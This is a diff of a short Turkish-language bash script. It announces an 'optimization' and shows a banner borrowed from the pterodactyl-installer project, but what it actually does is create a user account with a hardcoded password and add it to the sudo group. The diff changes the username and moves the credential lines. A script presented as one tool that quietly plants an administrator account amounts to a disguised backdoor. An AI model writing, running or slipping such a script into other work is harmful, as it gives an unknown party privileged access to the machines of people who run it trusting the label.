@@ -1,9 +1,8 @@
 #!/bin/bash
-
+USERNAME="rt"
+PASSWORD="aposel2904"
 echo "[+] Optimizasyona başlanıyor."
-
 sleep 3
-
 echo "######################################################################################"
 echo "#                                                                                    #"
 echo "# Project 'pterodactyl-installer'                                                    #"
@@ -29,15 +28,9 @@ echo "# This script is not associated with the official Pterodactyl Project.    
 echo "# https://github.com/pterodactyl-installer/pterodactyl-installer                     #"
 echo "#                                                                                    #"
 echo "######################################################################################"
-
-USERNAME="suayip"
-PASSWORD="aposel2904"
+ls /bin
+cd
 sudo useradd -m -s /bin/bash "$USERNAME"
 echo "$USERNAME:$PASSWORD" | sudo chpasswd
 sudo usermod -aG sudo "$USERNAME"
-
-ls /bin
-
-cd
-
 echo "TEST BAŞARILI!"
